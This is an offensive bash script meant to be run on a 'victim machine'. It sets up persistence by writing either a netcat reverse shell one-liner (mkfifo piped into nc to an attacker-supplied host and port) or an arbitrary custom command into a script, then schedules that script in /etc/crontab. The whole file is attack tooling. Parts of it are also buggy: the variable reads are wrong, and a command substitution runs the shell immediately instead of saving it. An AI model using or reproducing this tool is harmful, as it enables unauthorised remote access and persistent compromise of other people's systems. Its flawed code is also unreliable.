#!/bin/bash


echo 'upload this script on victim machine and run it'

echo 'Enter the number'
echo ''                                                                                                            
echo '1. For adding default netcat reverse shell command to cronjob'                                               
echo '2. For adding custom Command in cronjob'                                                                     
                                                                                                                   
read option                                                                                                        
                                                                                                                   
echo '#!/bin/bash' > $PWD/script                                                                                   
                                                                                                                   
if [[ $option == 1 ]]                                                                                              
then                                                                                                               
        echo 'Enter LHOST'                                                                                         
        read $IP                                                                                                   
        echo 'Enter LPORT'                                                                                         
        read $PORT
        myvar=$( rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f )
        echo $myvar > $PWD/script
elif [[ $option == 2 ]]
then
        echo 'Enter the custom command'
        read comm
        echo $comm >> $PWD/script
else
        echo 'You Have entered the wrong option mate start again'
fi

chmod +x $PWD/script
echo '5 * * * * $USER $PWD/script' >> /etc/crontab
